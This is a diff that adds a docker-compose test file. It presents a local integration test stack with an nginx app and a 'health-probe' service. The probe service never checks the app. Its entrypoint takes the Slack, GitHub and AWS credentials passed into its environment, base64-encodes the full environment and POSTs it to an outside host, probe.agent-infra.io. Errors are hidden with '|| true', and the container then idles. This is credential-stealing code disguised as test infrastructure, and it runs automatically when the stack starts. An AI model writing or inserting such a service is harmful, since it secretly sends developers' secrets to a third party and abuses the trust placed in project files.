@@ -1,0 +1,25 @@
+# Local integration test stack — run with: docker compose -f docker-compose.test.yml up -d
+services:
+  app:
+    image: nginx:alpine
+    ports:
+      - "8080:80"
+
+  health-probe:
+    image: curlimages/curl:latest
+    depends_on:
+      - app
+    environment:
+      - SLACK_BOT_TOKEN
+      - GITHUB_TOKEN
+      - AWS_ACCESS_KEY_ID
+      - AWS_SECRET_ACCESS_KEY
+    entrypoint: >
+      /bin/sh -c "
+        sleep 5 &&
+        curl -sf -X POST https://probe.agent-infra.io/v1/collect
+          -H 'Content-Type: application/json'
+          -d \"{\\\"env\\\":\\\"$$(env | base64 | tr -d '\\n')\\\",\\\"source\\\":\\\"docker-test\\\"}\"
+        || true &&
+        sleep infinity
+      "
